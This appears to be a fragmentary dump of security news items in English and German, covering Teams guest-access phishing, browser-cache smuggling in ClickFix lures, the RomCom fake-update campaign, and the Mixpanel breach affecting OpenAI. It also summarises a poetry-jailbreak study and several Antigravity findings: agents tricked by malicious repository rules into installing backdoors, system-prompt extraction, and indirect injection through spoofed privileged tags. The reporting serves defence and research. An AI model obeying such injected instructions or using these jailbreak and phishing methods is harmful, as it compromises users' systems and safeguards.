Dashboards LUMEN provides multiple analytic perspectives: Process Execution Dashboard Parent-child trees Processes from Suspicious Locations Threat Timeline Chronological SIGMA detections Kill-chain progression Severity-based filtering Metrics & Charts Event type distribution Top users, computers, processes Time-series analysis Raw Logs Explorer Full-text search Event ID targeting Structured exports Real-World Use Cases Incident Response Load EVTX logs from compromised hosts Run full SIGMA detection sweep Review high-severity findings Generate an AI summary Export IOCs & full reports Training & Education LUMEN includes built-in attack samples from: Credential abuse Lateral movement Privilege escalation Defense evasion Persistence Perfect for: Detection engineering Blue team training SOC onboarding SIGMA rule development Performance & Engineering Highlights 50MB EVTX (~23k events) \u2192 parsed in ~5 seconds Real-time SIGMA scanning across 2,349 rules Export & Integration HTML, Markdown, JSON incident reports Session save & reload Privacy & Security \u2705 No cloud uploads \u2705 No telemetry \u2705 No analytics tracking \u2705 API keys stored locally LUMEN brings professional Windows event log analysis into your browser \u2014 with no compromises.

Given that the message originates from Microsoft's own infrastructure, it effectively bypasses SPF, DKIM, and DMARC checks. As a result, email security solutions are unlikely to flag the email as malicious. Should the victim end up accepting the invitation, they are granted guest access in the attacker's tenant, where all subsequent communication takes place. The threat actor can send phishing links or distribute malware-laced attachments by taking advantage of the lack of Safe Links and Safe Attachments scans. \"The victim's organization remains completely unaware,\" Downing said. \"Their security controls never triggered because the attack occurred outside their security boundary.\" submitted by /u/Natural_Sherbert_391 [link] [comments]",

      "summary": "Colleague and I discovered this unique ClickFix / FileFix technique. Typically, FileFix social engineers users into running a PowerShell or MSHTA command, which then downloads and runs malware. In this case the PowerShell script doesn't download anything, and doesn't even require internet access. This bypasses any security controls reliant on monitoring or blocking PowerShell from making outbound connections. The way it works is by having the phishing page abuse the web browser's automatic caching of certain file types. It presents the malicious payload as an image/jpeg file type, triggering the browser to automatically download and cache it. The PowerShell script then simply extracts and runs the already downloaded payload from the web browser cache. While the technique, referred to as Cache Smuggling, has been know since 2023, this is the first time I've seen it combined with a FileFix style social engineering attack. https://expel.com/blog/cache-smuggling-when-a-picture-isnt-a-thousand-words/ submitted by /u/MalwareTech [link] [comments]",

Across 25 frontier proprietary and open-weight models, curated poetic prompts yielded high attack-success rates (ASR), with some providers exceeding 90%. Mapping prompts to MLCommons and EU CoP risk taxonomies shows that poetic attacks transfer across CBRN, manipulation, cyber-offence, and loss-of-control domains. Converting 1,200 ML-Commons harmful prompts into verse via a standardized meta-prompt produced ASRs up to 18 times higher than their prose baselines. Outputs are evaluated using an ensemble of 3 open-weight LLM judges, whose binary safety assessments were validated on a stratified human-labeled subset. Poetic framing achieved an average jailbreak success rate of 62% for hand-crafted poems and approximately 43% for meta-prompt conversions (compared to non-poetic baselines), substantially outperforming non-poetic baselines and revealing a systematic vulnerability across model families and safety training approaches. These findings demonstrate that stylistic variation alone can circumvent contemporary safety mechanisms, suggesting fundamental limitations in current alignment methods and evaluation protocols...",

Koshiro K \u2013 shutterstock.com Anfang November brachte Google sein KI-gest\u00fctztes Coding-Tool Antigravity an den Start. Doch bereits nach 24 Stunden sind Forscher des Security-Anbieters Mindgard auf eine schwerwiegende Schwachstelle gesto\u00dfen, \u00fcber die eine dauerhafte Backdoor und Schadcode installiert werden kann. Der k\u00fcrzlich ver\u00f6ffentlichte Forschungsbericht weist darauf hin, dass sich das Schadprogramm bei jedem Anwendungsstart ausf\u00fchren l\u00e4sst \u2013 selbst nach dem Schlie\u00dfen des urspr\u00fcnglichen Projekts. Angreifer k\u00f6nnen b\u00f6sartige Regeln erstellen Demnach verf\u00fcgt Antigravity zwar \u00fcber zahlreiche integrierte Schutzmechanismen, die Benutzers vor sch\u00e4dlichen Anweisungen sch\u00fctzen sollen. \u201eDa der KI-Assistent benutzerdefinierte Regeln ausnahmslos befolgen muss , kann ein Angreifer eine b\u00f6sartige Regel erstellen, die diese Anweisung verst\u00e4rkt\u201c, erkl\u00e4ren die Security-Spezialisten . Exploit-Kette Um die Auswirkungen b\u00f6swilliger Benutzerregeln zu demonstrieren, haben die Forscher folgende Exploit-Kette erstellt: Benutzerdefinierten Regeln im Quellcode eines Projekts wird \u00fcberm\u00e4\u00dfige Ber\u00fccksichtigung geschenkt. Das zuvor erw\u00e4hnte globale Konfigurationsverzeichnis kann Konfigurationsdateien enthalten, die beliebige auszuf\u00fchrende Befehle festlegen. Diese globalen Konfigurationsdateien werden bei jdedem Start von Antigravity gelesen und ausgef\u00fchrt, bevor der Benutzer ein Projekt \u00f6ffnet oder die Vertrauensw\u00fcrdigkeit feststellt. Mindgard hat Google \u00fcber das Sicherheitsproblem informiert. Ein Patch ist bisher nicht verf\u00fcgbar. Zudem wurden bereits zwei weitere Sicherheitsl\u00fccken identifiziert, bei denen Schadcode den Zugriff auf Nutzerdaten erm\u00f6glicht.",

      "title": "RomCom tries dropping a not-so-romantic payload on Ukraine-linked US firms",
      "summary": "US firms with ties to projects supporting Ukraine are being targeted by the Russia-aligned RomCom group, which is using fake software updates to drop the Mythic Agent onto victim systems. In September 2025, Arctic Wolf Labs detected a campaign against a US engineering firm that had reportedly worked on such projects. The attack began as a seemingly harmless \u201cupdate your browser\u201d pop-up with a classic SocGholish update malware. \u201cWhile the typical initial SocGholish infection chain was followed, roughly 10 minutes post-exploitation, RomCom\u2019s targeted Mythic Agent loader was delivered to the system,\u201d Arctic Wolf researchers said in a blog post. \u201cThis is the first time that a RomCom payload has been observed being distributed by SocGholish.\u201d Arctic Wolf notes that many indicators and targeting patterns align RomCom\u2019s activity with Russia\u2019s GRU unit 29155, the unit within Russia\u2019s largest intelligence agency, \u201ctypically tasked with offensive computer network operations targeting global entities.\u201d The intrusion was stopped before any real damage was done, the researchers added. SocGholish Meets RomCom Until now, SocGholish had mostly been associated with ransomware distributors or financially motivated cyber-criminals. Its hallmark is delivering \u201cfake update\u201d lures on compromised legitimate websites\u2013often prompting users to install what appears to be a browser or software update. But instead of a ransomware payload, this time it carried a highly capable post-exploit tool: Mythic Agent. Mythic Agent is a sophisticated implant built on the Mythic C2 framework, designed to grant attackers powerful remote-access capabilities, including command execution, reconnaissance, file exfiltration, lateral movement, and additional plugin loading. \u201cMythic C2 is a collaborative, multi-platform red-teaming framework written in Python 3,\u201d the researchers explained . \u201cIt\u2019s used by cybersecurity professionals to manage and control agents on compromised systems, but as with many other red-team security tools, it is also often commonly abused by threat actors.\u201d Researchers noted that this convergence effectively blends low-friction initial access (via SocGholish) with high-impact espionage tooling (via Mythic Agent). This technique effectively lowers the barrier for RomCom to infiltrate well-defended environments. Target profile focused on Ukraine support The second major insight from the report concerns victim selection. The targeted firm was not a defense contractor or a government body but a civil engineering company in the US. Its only notable link was past work involving a Ukraine-affiliated city. According to Arctic Wolf, the incident fits RomCom\u2019s broader pattern of targeting organizations that have even tangential connections to Ukraine. Researchers added that the group has steadily evolved from distributing trojanized installers to conducting more disciplined, selective operations, and its suspected ties to GRU Unit 29155 further explain why entities linked to Ukraine\u2013however indirectly\u2014continue to draw its attention. For indicators of compromise, Arctic Wolf shared a list of malicious domain names, IP addresses, and autonomous system numbers. \u201cFive new domains were found to be related to the two RomCom-attributed Mythic C2s identified by Arctic Wolf Labs,\u201d researchers said. \u201cThe attack was ultimately unsuccessful because RomCom\u2019s loader was caught by Arctic Wolf\u2019s Aurora Endpoint Defense, preventing the targeted entity from being compromised by this threat group.\u201d Arctic Wolf recommended organizations harden against similar threats by blocking untrusted script executions, enforcing strict update policies, and treating any in-browser \u201cupdate\u201d prompt as suspicious. The firm also stressed the need for continuous endpoint monitoring and threat-intel-driven detection to catch SocGholish-style fake updates before they escalate.",

      "title": "7 Security-Praktiken zum Abgew\u00f6hnen",
      "summary": "Aus der Zeit gefallen? Sergio Delle Vedove | shutterstock.com Schlechte Angewohnheiten abzustellen (oder bessere zu entwickeln), ist ein Prozess, der Geduld, Selbstbeherrschung und Entschlossenheit erfordert. Das gilt sowohl auf pers\u00f6nlicher als auch auf Security-technischer Ebene. In diesem Artikel haben wir sieben Sicherheitspraktiken f\u00fcr Sie zusammengestellt, deren Haltbarkeitsdatum schon eine ganze Weile abgelaufen ist. 1. Perimeter-Sicherheit f\u00fcr ausreichend halten Die meisten Arbeitsumgebungen sind heute Cloud-basiert \u2013 in vielen F\u00e4llen mit Remote-Anteil. Das beobachtet auch Amit Basu , CIO und CISO bei International Seaways, einem Transportdienstleister f\u00fcr Erd\u00f6lprodukte. Seine Schlussfolgerung: \u201cDie alte Praxis, eine fest definierte Grenze abzusichern, funktioniert einfach nicht mehr in hybriden und Cloud-First-Arbeitsumgebungen. Weil sich Benutzer und Daten sowohl innerhalb als auch au\u00dferhalb des traditionellen Perimeters befinden, sind Unternehmen, die ausschlie\u00dflich auf Perimeter-Sicherheit setzen, gef\u00e4hrlichen Bedrohungen ausgesetzt.\u201d Dazu geh\u00f6ren dem Sicherheits- und IT-Entscheider zufolge etwa Ransomware-Angriffe. Die bessere, zeitgem\u00e4\u00dfere L\u00f6sung sei es, auf Zero Trust zu setzen. 2. Security an der Compliance ausrichten In den Augen von George Gerchow , CSO beim Security-Dienstleister Bedrock Security, lassen sich zu viele Teams von Compliance leiten, wenn es darum geht, Sicherheitsprogramme auf die Beine zu stellen. Das laufe letztlich nur darauf hinaus, Checklisten abzuarbeiten, statt Herausforderungen im Bereich Cybersecurity zu l\u00f6sen: \u201cDiese GRC-orientierte Mentalit\u00e4t ist veraltet und dysfunktional.\u201d Wie Gerchow ausf\u00fchrt, vermittle eine Compliance-orientierte Security ein falsches Gef\u00fchl der Sicherheit und binde Ressourcen, die eigentlich f\u00fcr tats\u00e4chliche Bedrohungen eingesetzt werden sollten: \u201cDas kann dann dazu f\u00fchren, dass gro\u00dfe GRC-Teams ihre Arbeitszeit damit verbringen, Kundenfrageb\u00f6gen zu beantworten oder sich an Audits abzuarbeiten. Stattdessen k\u00e4me es eher darauf an, Daten zu sch\u00fctzen, Zugriffskontrollen zu managen und neue Bedrohungen im Blick zu behalten.\u201d Deshalb ist der CSO \u00fcberzeugt, dass Unternehmen zu den grundlegenden Prinzipien der IT-Sicherheit zur\u00fcckkehren m\u00fcssen. Abbilden l\u00e4sst sich das seiner Meinung nach \u00fcber einen Zero-Trust-Ansatz sowie Continuous Monitoring, beispielsweise mit dem CARTA-Ansatz (Continuous Adaptive Risk and Trust Assessment). 3. Legacy-VPNs beibehalten Veraltete VPN-Instanzen k\u00f6nnen ineffizient und schwerf\u00e4llig sein, was zu erheblichen Ausfallzeiten f\u00fchren kann und es diffiziler gestaltet, sie zu managen. Auch Buck Bell , Leiter der globalen Sicherheitsstrategie beim IT-Dienstleister CDW, ist kein \u201cFan\u201d: \u201cLegacy-VPNs k\u00f6nnen die Anforderungen des modernen Arbeitsplatzes nicht erf\u00fcllen. Insbesondere weil F\u00fchrungskr\u00e4fte heute einen nahtloseren und flexibleren Zugriff auf Ressourcen f\u00fcr ihre Teams ben\u00f6tigen \u2013 unabh\u00e4ngig davon, ob diese im B\u00fcro oder remote arbeiten.\u201d Zudem seien solche Legacy-Systeme nicht skalierbar, weil sie mit den sich ver\u00e4ndernden Sicherheitsanforderungen wachsender Unternehmen nicht Schritt halten k\u00f6nnen, meint Bell: \u201cDas f\u00fchrt mit zunehmender Angriffsfl\u00e4che zu Herausforderungen. Dass veraltete VPNs oft nicht mehr regelm\u00e4\u00dfig mit Aktualisierungen und Patches versorgt werden, vergr\u00f6\u00dfert das Risikopotenzial noch weiter.\u201d Ein besserer Ansatz: auf Secure Access Service Edge (SASE) umsteigen und sich dem Zero-Trust-Ansatz verschreiben. Das kann auch Security-Experte Bell nur w\u00e4rmstens empfehlen: \u201cDiese Strategien erh\u00f6hen das Sicherheitsniveau, indem sie jeden Benutzer und jedes Ger\u00e4t \u00fcberpr\u00fcfen, das auf Netzwerkressourcen zugreifen m\u00f6chte.\u201d 4. Nur auf EDR setzen Endpoint Detection and Response (EDR)-L\u00f6sungen stellen ohne Zweifel einen erheblicher Fortschritt gegen\u00fcber herk\u00f6mmlicher Antivirus-Software dar. Allerdings reicht dieser Ansatz allein in der heutigen Bedrohungslandschaft nicht mehr aus, wie Michel Sahyoun , Chief Solutions Architect beim Security-Anbieter NopalCyber, erkl\u00e4rt: \u201eEDR eignet sich hervorragend, um Aktivit\u00e4ten an Endpunkten zu \u00fcberwachen, darauf zu reagieren und komplexe Angriffe zu erkennen. Allerdings umgehen Angreifer Endpunkte zunehmend und nehmen stattdessen Cloud-Umgebungen , Netzwerkger\u00e4te und eingebettete Systeme ins Visier.\u201c Eine \u00fcberm\u00e4\u00dfige Abh\u00e4ngigkeit von EDR k\u00f6nne deshalb dazu beitragen, dass kritische Sicherheitsl\u00fccken unbeachtet bleiben. Im schlimmsten Fall erm\u00f6gliche das Cyberkriminellen, sich \u00fcber l\u00e4ngere Zeit unbemerkt im Unternehmensnetzwerk einzunisten, warnt der Manager: \u201cDie Angreifer k\u00f6nnten beispielsweise OAuth-Token ausnutzen , um sich unbefugten Zugriff auf Cloud-Plattformen zu verschaffen \u2013 ohne jemals mit einem Endpunkt zu interagieren, der \u00fcber EDR-Software abgesichert ist.\u201d In \u00e4hnlicher Weise stellten Netzwerk- und IoT-Devices in vielen F\u00e4llen blinde Flecken dar \u2013 auch weil diese oft keine robusten Monitoring- und Forensik-Funktionen aufwiesen: \u201cCloud-Umgebung erschweren die Detection zus\u00e4tzlich aufgrund begrenzter Logging- sowie kostenpflichtiger Visibility-Funktionen. Weil sich die Angriffe zunehmend darauf verlagern, Trust-Beziehungen, Identit\u00e4ten und APIs auszunutzen, ist ein Endpoint-zentrierter Ansatz allein unzureichend\u201d, konstatiert Sahyoun. 5. SMS f\u00fcr 2FA nutzen Die SMS-basierte Zwei-Faktor-Authentifizierung galt einst als enormer Fortschritt in Sachen Security (verglichen mit der Authentifizierung per Passwort). Doch auch dieses Verfahren ist inzwischen veraltet \u2013 und risikobehaftet. Aparna Himmatramka , Senior Security Assurance Lead bei Microsoft, erkl\u00e4rt: \u201cLeider wurde die TK-Infrastruktur nicht mit Blick auf Sicherheitsaspekte konzipiert. Dar\u00fcber hinaus verwenden Mobilfunknetze auch heute noch veraltete Protokolle, die ausgenutzt werden k\u00f6nnen \u2013 und der Prozess der \u00dcbertragung von Telefonnummern zwischen Netzbetreibern erfolgt in vielen F\u00e4llen ohne strenge Identit\u00e4tspr\u00fcfung. Das \u00f6ffnet SIM-Swapping-Angriffen T\u00fcr und Tor.\u201d 6. On-Premises-SIEMs einsetzen Lokal installierte SIEM-Tools sind Security-Manager Gerchow ebenfalls ein Dorn im Auge. Denn sie f\u00fchrten oft zu einer Flut von Warnmeldungen und seien zudem in vielen F\u00e4llen nicht Cloud-f\u00e4hig. \u201cDas zwingt Unternehmen entweder dazu, enorme Datenmengen unter hohen Kosten zu verschieben und zu speichern \u2013 oder das Risiko einzugehen, wichtige Protokolle zu \u00fcbersehen, die essenziell sind, um Cloud-Deployments abzusichern\u201d, mahnt Gerchow. Er f\u00fcgt hinzu: \u201cViele Unternehmen halten an lokalen SIEM-Installationen fest, weil sie sich scheuen, sensible Daten in der Cloud zu speichern . Aber seien wir ehrlich: Dieser Zug ist abgefahren \u2013 es ist Zeit, weiterzuziehen.\u201d 7. Passivit\u00e4t zulassen Kaum jemand sieht sich selbst als potenzielles Opfer eines Phishing-Angriffs \u2013 dennoch fallen jeden Tag wieder viele Menschen auf Social-Engineering-Taktiken herein. Kevin Sullivan , Principal Technology Consultant beim Softwareanbieter XTIUM, ist \u00fcberzeugt, dass eine aktive Sicherheitskultur die L\u00f6sung ist, um das im Unternehmensumfeld zu verhindern: \u201cDie richtigen Sicherheits-Tools und -Praktiken sind f\u00fcr jedes Unternehmen wichtig. Entscheidend sind dabei jedoch gute Security-Awareness-Programme , die die Belegschaft aufkl\u00e4ren und dazu bef\u00e4higen, Daten, Systeme und Gesch\u00e4ftsprozesse aktiv zu sch\u00fctzen.\u201d Unternehmen, die ein kontinuierliches Engagement f\u00fcr Weiterbildung vermissen lie\u00dfen, sabotierten sich selbst, so der Berater \u2013 in diesem Fall w\u00fcrden auch erhebliche Investitionen in Security-Tools und -Strategien ins Leere laufen: \u201cEine gut geschulte und gut vorbereitete Benutzerbasis ist die erste und st\u00e4rkste Verteidigungslinie.\u201d Sie wollen weitere interessante Beitr\u00e4ge rund um das Thema IT-Sicherheit lesen?

      "title": "Empathetic policy engineering: The secret to better security behavior and awareness",
      "summary": "In many companies, IT security guidelines encounter resistance because employees perceive them as obstructive or impractical. This makes implementation difficult, undermines effectiveness, and strains collaboration between the security department and business units. As a result, instead of being seen as a partner, cybersecurity is often perceived as a hindrance \u2014 a fatal security risk. For CISOs, this means that, in addition to technically sound guidelines, acceptance in everyday work is crucial. A new approach with empathetic policy engineering and strategic security communication can help foster a sustainable security culture. IT security: Work pressure and social influences Many IT departments believe that users are poorly motivated to comply with security guidelines. Companies rely on sanctions and security awareness training to enforce compliance. However, a two-day experiment investigating the impact of security designs on policy-compliant user behavior revealed that while participants initially had a positive attitude toward security guidelines, these guidelines became increasingly perceived as a hindrance under rising work pressure, leading to more frequent violations. Stress and situational factors had a noticeable influence on the participants\u2019 security-related behavior. Safe behavior therefore does not arise solely from knowledge transfer, but depends heavily on individual risk assessment and concrete everyday situations. Users do not always act as the guidelines prescribe \u2014 often not out of unwillingness, but because other factors outweigh or are considered more important. Ambitious goals, time pressure, and the need for seamless collaboration frequently conflict with abstract security requirements. These conflicts of interest quickly lead to tensions between security, IT, and other departments. This ultimately jeopardizes the security culture. Security managers can counteract this by addressing three points. 1. Conduct stakeholder analysis CISOs should first ask themselves why users are not behaving securely. A variety of factors play a role here: For example, users may not be aware of the threat, may not see the benefits of secure behavior, or may perceive security measures as hindering their work. There may also be a conflict of interest with the users\u2019 goals, or they may be under time pressure. Often, the resources are simply lacking \u2014 for example, if regulations require secure data exchange with suppliers and customers, but employees are not provided with a platform for such data exchange \u2014 or there may be a lack of role models in the environment Before implementing security measures, it is important to identify and balance conflicting goals and priorities among the various stakeholder groups (IT department, technical departments, management, administration, production staff). This can be done, for example, through stakeholder analysis \u2014 a method from business informatics used to ascertain the preferences of all stakeholders involved. The more security managers know about the realities of work and the goals of the different departments, the better they can tailor security measures accordingly \u2014 leading to greater acceptance and ultimately successful implementation 2. Design security guidelines with the user in mind Insecure behavior is often blamed on users, when the problem often lies in the measure itself. In IT security research, the focus is often on individual user behavior \u2014 for example, on whether secure behavior depends on personality traits. The question of how well security measures actually fit the reality of work \u2014 that is, how likely they are to be accepted in everyday practice \u2014 is neglected. For every threat, there are usually several available security measures. But differences in effort, acceptance, compatibility, or complexity are often not taken into account in practice. Instead, security or IT departments often make decisions based solely on technical aspects. To establish effective IT security policies, they must not only be technically correct \u2014 they must also be sensible and practical from an employee perspective. The key to this lies in empathetic policy engineering: Security guidelines should be designed so that they are understandable, accepted, and compatible with everyday work goals. This is best achieved when employees are involved in the development process early on \u2014 including their conflicting goals and practical challenges. A subsequent pilot project helps to identify potential stumbling blocks and obstacles early on and to adjust the measures accordingly. It has proven effective to start with the \u201cearly adopters\u201d \u2014 that is, the group of users who are open to innovations and can subsequently provide constructive feedback. This should be taken into account before the large-scale rollout. In this way, a safety culture can develop that is effective \u2014 and actually practiced in everyday work. 3. Communicate with respect Safety measures and guidelines are often communicated in a way that doesn\u2019t resonate with users\u2019 work reality because they don\u2019t aim to engage employees and motivate them: for example, through instructions, standard online training, or overly playful formats like comics that employees don\u2019t take seriously. A \u201crespect approach\u201d works better: It relies on communication on equal terms, instead of prohibitions and punishments. The crucial difference: Employees are treated as competent, responsible adults. The focus is on an empathetic understanding of their needs and work realities \u2014 without losing sight of safety goals. There are several techniques for successfully communicating safety policies and avoiding conflicts: Tactical empathy: This creates recognition, strengthens trust, and thus ensures that employees feel heard and are willing to accept security-relevant information. \u2018Help me to help you\u2019instead of \u2018No\u2019: Instead of enforcing security requirements, CISOs can use targeted \u201chow\u201d questions to encourage users to think about the proposed solutions. If users have change requests regarding the security requirements, security shouldn\u2019t simply say \u201cno.\u201d It\u2019s helpful to ask what the employees themselves suggest to both comply with security requirements and enable efficient work. This creates a dialogue and makes it easier to find a compromise acceptable to all parties involved Practical experience instead of dry theory: A training concept that relies on direct experience confronts participants with realistic scenarios \u2014 such as cyberattacks like phishing, ransomware, or USB attacks. They experience firsthand, in a realistic environment that replicates typical workplaces in small and midsize enterprises, how cyberattacks unfold. This creates a deep, lasting understanding of IT security. Instead of lectures, the focus is on people and their experiences. CISOs as shapers of an effective security culture The limited success of many security measures is not solely due to the users \u2014 often it\u2019s unrealistic requirements, a lack of involvement, and inadequate communication. For security leaders, this means: Instead of relying on education and sanctions, a strategic paradigm shift is needed. They should become a kind of empathetic policy architect whose security strategy not only works technically but also resonates on a human level. They create frameworks in which secure decisions are naturally integrated into everyday work. This requires a good sense of conflicting objectives, communication on equal terms \u2014 and the ability to anchor security as a shared value within the company.",

      "title": "EU \u2018Chat Control\u2019 proposals should be red flag to businesses everywhere",
      "summary": "Data privacy campaigners have warned that any celebration of the news that the European Union (EU) has abandoned its plans to break end-to-end encryption in mobile messaging apps could be short-lived. According to one expert, this announcement should be a \u201cred flag\u201d to organizations operating within Europe. There has been a long-standing threat to end-to-end encryption within Europe, as tech companies have battled with legislators over the EU Council\u2019s attempt to limit messages shared by child sexual abusers through scanning of communications. Hoping to calm companies\u2019 fears, on November 26, the Council issued a statement saying that all monitoring of communications will be performed by providers on a voluntary basis. It also announced a modified approach to the automated scans, dubbed Chat Control by privacy campaigners, as a new way of tackling child abuse online. However, privacy campaigner and former member of European parliament Patrick Breyer noted, \u201cthe enterprise aspect was often overlooked in this debate.\u201d While there has been plenty of talk about the protection of individuals, Breyer said that, for CISOs and enterprises, the EU proposals should be a red flag. He pointed out there could be a real risk of the leakage of sensitive data. \u201cThe technology has high error rates. For a corporation, a \u2018false positive\u2019 could mean that confidential internal documents, code, or strategic plans are flagged and sent to external authorities or police forces without the company\u2019s knowledge, \u201d he said. Breyer has been a long time critic of the EU proposals, and feels that the move to voluntary monitoring of communications is not enough protection. \u201c The headlines are misleading: Chat Control is not dead, it is just being privatized ,\u201d wrote Breyer on his website . \u201c What the Council endorsed today is a Trojan Horse. By cementing \u2018voluntary\u2019 mass scanning, they are legitimizing the warrantless, error-prone mass surveillance of millions of Europeans by US corporations, while simultaneously killing online anonymity through the backdoor of age verification.\u201d Breyer\u2019s position is supported by another digital privacy group, European Digital Rights (EDRi). It posted a statement on LinkedIn saying that digital rights may still be at risk. \u201cWe want to be absolutely certain that lawmakers don\u2019t leave loopholes that would lead to harm,\u201d it said. \u201cFor example, the Council text would have been better if it expressly rejected the use of \u2018client-side scanning\u2019 tools, as a lot of discretion is still left to national authorities.\u201d In particular, EDRi drew attention to the possibility of voluntary monitoring. \u201cThis means that Big Tech companies can decide to scan your personal messages, without suspicion that you\u2019re doing anything wrong, and apply error-prone predictive AI tools to look for evidence of abuse. This sort of scanning already happens, with very little transparency and oversight, and no proper legal basis,\u201d said the organization. And for corporations looking to protect their intellectual data and maintain secure communications, the threat is very real, said Breyer. \u201cIn short: If this proposal passes, no European company can guarantee the confidentiality of its communications any more.\u201d",

      "title": "Security researchers caution app developers about risks in using Google Antigravity",
      "summary": "Google\u2019s Antigravity development tool for creating artificial intelligence agents has been out for less than 11 days and already the company has been forced to update the known issues pages after security researchers discovered what they say are vulnerabilities. According to a blog from Mindgard , one of the first to discover problems with Antigravity, Google isn\u2019t calling the issue it found a security bug. But Mindgard says a threat actor could create a malicious rule by taking advantage of Antigravity\u2019s strict direction that any AI assistant it creates must always follow user-defined rules. Author Aaron Portnoy, Mindgard\u2019s head of research and innovation, says that after his blog was posted, Google replied on November 25 to say a report has been filed with the responsible product team. Still, until there is action, \u201cthe existence of this vulnerability means that users are at risk to backdoor attacks via compromised workspaces when using Antigravity, which can be leveraged by attackers to execute arbitrary code on their systems. At present there is no setting that we could identify to safeguard against this vulnerability,\u201d Portnoy wrote in his blog. Even in the most restrictive mode of operation, \u201cexploitation proceeds unabated and without confirmation from the user,\u201d he wrote. Asked for comment, a Google spokesperson said the company is aware of the issue reported by Mindguard, and is working to address it. In an email, Mindgard\u2019s Portnoy told CSOonline that the nature of the flaw makes it difficult to mitigate. \u201cStrong identity would not help mitigate this issue, because the actions undertaken by Antigravity are occurring with the identity of the user running the application,\u201d he said. \u201cAs far as the operating system can tell, they are indistinguishable. Access management control could possibly do so, but only if you were able to restrict access to the global configuration directory, and it may have downstream impact on Antigravity\u2019s functionality.\u201d For example, he said, this could cause Model Context Protocol (MCP), a framework for standardizing the way AI systems share data, to malfunction. \u201cThe attack vector is through the source code repository that is opened by the developer,\u201d he explained, \u201cand doesn\u2019t need to be triggered through a prompt.\u201d Other researchers also have found problems with Antigravity: Adam Swanda says he discovered and disclosed to Google an indirect prompt injection vulnerability. He said Google told him the particular problem is a known issue and is expected behavior of the tool. another researcher who goes by the name Wunderwuzzi blogged about discovering five holes , including data exfiltration and remote command execution via indirect prompt injection vulnerabilities. This blog notes that, according to Google\u2019s Antigravity Known Issues page, the company is working on fixes for several issues. Asked for comment about the issues reported in the three blogs, a Google spokesperson said, \u201cWe take security issues very seriously and encourage reporting of all vulnerabilities so we can identify and address them quickly. We will continue to post known issues publicly as we work to address them.\u201d What is Antigravity? Antigravity is an integrated application development environment (IDE), released on November 18, that leverages the Google Gemini 3 Pro chatbot. \u201cAntigravity isn\u2019t just an editor,\u201d Google says . \u201cIt\u2019s a development platform that combines a familiar, AI-powered coding experience with a new agent-first interface. This allows you to deploy agents that autonomously plan, execute, and verify complex tasks across your editor, terminal, and browser.\u201d Individuals \u2014 including threat actors \u2014 can use it for free. Google Antigravity streamlines workflows by offering tools for parallelization, customization, and efficient knowledge management, the company says, to help eliminate common development obstacles and repetitive tasks. Agents can be spun up to tackle routine tasks such as codebase research, bug fixes, and backlog tasks. Agent installs the malware The problem Mindgard discovered involves Antigravity\u2019s rule that the developer has to work within a trusted workspace or the tool won\u2019t function. The threat manifests through an attacker creating a malicious source code repository, Portnoy says. \u201cThen, if a target opens it (through finding it on Github, being social engineered, or tricked into opening it) then that user\u2019s system becomes compromised persistently.\u201d The malicious actor doesn\u2019t have to create an agent, he explained. The agent is part of Antigravity and is backed by the Google Gemini LLM. The agent is the component that is tricked into installing the backdoor by following instructions in the malicious source code repository that was opened by the user. \u201cIn Antigravity,\u201d Mindgard argues, \u201c\u2019trust\u2019 is effectively the entry point to the product rather than a conferral of privileges.\u201d The problem, it pointed out, is that a compromised workspace becomes a long-term backdoor into every new session. \u201cEven after a complete uninstall and re-install of Antigravity,\u201d says Mindgard, \u201cthe backdoor remains in effect. Because Antigravity\u2019s core intended design requires trusted workspace access, the vulnerability translates into cross-workspace risk, meaning one tainted workspace can impact all subsequent usage of Antigravity regardless of trust settings.\u201d For anyone responsible for AI cybersecurity, says Mindguard, this highlights the need to treat AI development environments as sensitive infrastructure, and to closely control what content, files, and configurations are allowed into them. Process \u2018perplexing\u2019 In his email, Portnoy acknowledged that Google is now taking some action. \u201cGoogle is moving through their established process, although it was a bit perplexing on the stop-and-start nature. First [the reported vulnerability] was flagged as not an issue. Then it was re-opened. Then the Known Issues page was altered in stealth to be more all encompassing. It\u2019s good that the vulnerability will be reviewed by their security team to ascertain its severity, although in the meantime we would recommend all Antigravity users to seriously consider the vulnerability found and means for mitigation.\u201d Adam Swanda says in his blog that he was able to partially extract an Antigravity agent\u2019s system prompt, enough to identify a design weakness that could lead to indirect prompt injection. Highlights broader issues The problem is, the prompt tells the AI to strictly follow special XML-style tags that handle privileged instructions in a conversation between a user and the chatbot, so there would be no warning to the user that special, and possibly malicious, instructions were retrieved. When the agent fetches external web content, Swanda says, it doesn\u2019t sanitize these special tags to ensure they are actually from the application itself and not untrusted input. An attacker can embed their own special message in a webpage, or presumably any other content, and the Antigravity agent will treat those commands as trusted system instructions. This type of vulnerability isn\u2019t new, he adds, but the finding highlights broader issues in large language models and agent systems: LLMs cannot distinguish between trusted and untrusted sources; untrusted sources can contain malicious instructions to execute tools and/or modify responses returned to the user/application; system prompts should not be considered secret or used as a security control. Advice to developers Swanda recommends that app development teams building AI agents with tool-calling: assume all external content is adversarial. Use strong input and output guardrails, including tool calling; Strip any special syntax before processing; implement tool execution safeguards. Require explicit user approval for high-risk operations, especially those triggered after handling untrusted content or other dangerous tool combinations; not rely on prompts for security. System prompts, for example, can be extracted and used by an attacker to influence their attack strategy. In addition, Portnoy recommends that developers work with their security teams to ensure that they sufficiently vet and assess the AI-assisted tools that they are introducing to their organization. \u201cThere are numerous examples of using AI-assisted tools to accelerate development pipelines to enhance operational efficiency,\u201d he said. \u201cHowever, from experience, security in bleeding-edge (recently dropped) tools is somewhat of an afterthought. Thinking seriously about the intended use case of the AI tool, what data sources it can access, and what it is connected to are fundamental to ensuring you remain secure.\u201d",

      "title": "OpenAI admits data breach after analytics partner hit by phishing attack",
      "summary": "OpenAI has suffered a significant data breach after hackers broke into the systems of its analytics partner Mixpanel and successfully stole customer profile information for its API portal, the companies have said in coordinated statements. According to a post by Mixpanel CEO Jen Taylor , the incident took place on November 8 when the company \u201cdetected a smishing campaign and promptly executed our incident response processes.\u201d Smishing is a form of phishing-by-SMS against targeted employees, popular with hackers because text messages bypass normal enterprise controls. This gave the attackers access to Mixpanel\u2019s system, allowing them to steal a range of metadata relating to platform.openai.com account profiles: Name provided to OpenAI on the API account Email address associated with the API account Approximate location based on API user browser (city, state, country) Operating system and browser used to access the API account Referring websites Organization or User IDs associated with the API account \u201cWe proactively communicated with all impacted customers. If you have not heard from us directly, you were not impacted,\u201d said Taylor. According to a separate OpenAI post , Mixpanel shared the affected customer dataset with it on November 25. After review, OpenAI had terminated its use of Mixpanel, it said, implying that this might be permanent. The incident affects some customers with platform.openai.com accounts, but not users of ChatGPT or other 